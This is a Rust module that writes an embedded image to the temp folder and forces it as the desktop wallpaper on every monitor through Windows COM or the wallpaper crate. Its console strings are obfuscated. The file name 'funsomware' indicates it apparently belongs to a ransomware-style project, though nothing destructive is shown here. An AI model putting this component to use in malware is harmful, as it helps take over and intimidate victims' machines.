use cryptify::encrypt_string;
use std::fs;
use std::io::Write;
use std::path::PathBuf;

/// Embedded wallpaper image
const WALLPAPER_IMAGE: &[u8] = include_bytes!("../rsrc/wallpaper.png");

/// Set the wallpaper by extracting the embedded image and setting it
pub fn set_wallpaper() -> Result<(), Box<dyn std::error::Error>> {
    // Get temp directory for wallpaper
    let wallpaper_path = get_wallpaper_path()?;
    
    if crate::config::SHOW_CLI {
        println!("{} {:?}", encrypt_string!("Extracting wallpaper to"), wallpaper_path);
    }
    
    // Write embedded image to disk
    let mut file = fs::File::create(&wallpaper_path)?;
    file.write_all(WALLPAPER_IMAGE)?;
    
    if crate::config::SHOW_CLI {
        println!("{}", encrypt_string!("Setting wallpaper..."));
    }
    
    // On Windows, use direct Windows API for more reliable wallpaper setting
    #[cfg(target_os = "windows")]
    {
        set_wallpaper_windows(&wallpaper_path)?;
    }
    
    // On other platforms, use the wallpaper crate
    #[cfg(not(target_os = "windows"))]
    {
        wallpaper::set_from_path(wallpaper_path.to_str().unwrap())?;
    }
    
    if crate::config::SHOW_CLI {
        println!("{}", encrypt_string!("Wallpaper set successfully!"));
    }
    
    Ok(())
}

/// Set wallpaper using the modern IDesktopWallpaper COM interface.
/// This is the ONLY reliable method on Windows 10/11.
/// SystemParametersInfoW is known to silently set solid color instead of the picture.
///
/// IMPORTANT: All COM operations run in a dedicated thread to avoid polluting
/// the main thread's COM apartment state, which would break MessageBoxW calls.
#[cfg(target_os = "windows")]
fn set_wallpaper_windows(path: &PathBuf) -> Result<(), Box<dyn std::error::Error>> {
    let path_owned = path.clone();
    let show_cli = crate::config::SHOW_CLI;
    
    // Run the entire COM operation in a dedicated thread.
    // CoInitializeEx/CoUninitialize on the main thread would corrupt its
    // apartment state and prevent MessageBoxW from working afterwards.
    let handle = std::thread::spawn(move || -> Result<(), String> {
        use std::ffi::OsStr;
        use std::os::windows::ffi::OsStrExt;
        use windows::core::{GUID, PCWSTR};
        use windows::Win32::System::Com::{
            CoInitializeEx, CoCreateInstance, CoUninitialize,
            CLSCTX_ALL, COINIT_APARTMENTTHREADED,
        };
        use windows::Win32::UI::Shell::{IDesktopWallpaper, DWPOS_FILL};
        
        // CLSID for DesktopWallpaper COM class
        // {C2CF3110-460E-4FC1-B9D0-8A1C0C9CC4BD}
        const CLSID_DESKTOP_WALLPAPER: GUID = GUID {
            data1: 0xC2CF3110,
            data2: 0x460E,
            data3: 0x4FC1,
            data4: [0xB9, 0xD0, 0x8A, 0x1C, 0x0C, 0x9C, 0xC4, 0xBD],
        };
        
        let path_str = path_owned.to_str().unwrap();
        
        if show_cli {
            println!("{} {}", encrypt_string!("Setting wallpaper via IDesktopWallpaper COM:"), path_str);
        }
        
        // Convert path to wide string (null-terminated UTF-16)
        let path_wide: Vec<u16> = OsStr::new(path_str)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();
        
        unsafe {
            // Initialize COM with apartment-threaded model (required for shell COM objects)
            CoInitializeEx(None, COINIT_APARTMENTTHREADED)
                .ok().map_err(|e| format!("CoInitializeEx failed: {}", e))?;
            
            if show_cli {
                println!("{}", encrypt_string!("COM initialized on dedicated thread"));
            }
            
            // Create IDesktopWallpaper COM instance
            let wallpaper: IDesktopWallpaper = CoCreateInstance(
                &CLSID_DESKTOP_WALLPAPER,
                None,
                CLSCTX_ALL,
            ).map_err(|e| format!("Failed to create IDesktopWallpaper: {}", e))?;
            
            if show_cli {
                println!("{}", encrypt_string!("IDesktopWallpaper COM object created"));
            }
            
            // Set wallpaper on ALL monitors (NULL monitorID = all monitors)
            wallpaper.SetWallpaper(
                PCWSTR(std::ptr::null()),    // NULL = all monitors
                PCWSTR(path_wide.as_ptr()), // wallpaper file path
            ).map_err(|e| format!("SetWallpaper failed: {}", e))?;
            
            if show_cli {
                println!("{}", encrypt_string!("Wallpaper image path set via COM"));
            }
            
            // Set wallpaper position to Fill (scales to fill entire screen)
            wallpaper.SetPosition(DWPOS_FILL)
                .map_err(|e| format!("SetPosition failed: {}", e))?;
            
            if show_cli {
                println!("{}", encrypt_string!("Wallpaper position set to Fill"));
            }
            
            // Drop the COM object before CoUninitialize
            drop(wallpaper);
            
            // Cleanup COM on this thread only
            CoUninitialize();
            
            if show_cli {
                println!("{}", encrypt_string!("COM cleanup done, wallpaper should be active"));
            }
        }
        
        Ok(())
    });
    
    // Wait for the COM thread to finish and propagate any errors
    match handle.join() {
        Ok(Ok(())) => Ok(()),
        Ok(Err(e)) => Err(e.into()),
        Err(_) => Err("Wallpaper COM thread panicked".into()),
    }
}

/// Get the path where we'll save the wallpaper
fn get_wallpaper_path() -> Result<PathBuf, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        // Windows: Use AppData\Local\Temp
        let temp_dir = std::env::temp_dir();
        Ok(temp_dir.join("funsomware_wallpaper.png"))
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        // Linux: Use /tmp
        Ok(PathBuf::from("/tmp/funsomware_wallpaper.png"))
    }
}

/// Check if wallpaper setting is supported on this platform
#[allow(dead_code)]
pub fn is_supported() -> bool {
    // The wallpaper crate supports Windows, macOS, and most Linux DEs
    // It will return an error if not supported, so we'll just try it
    true
}
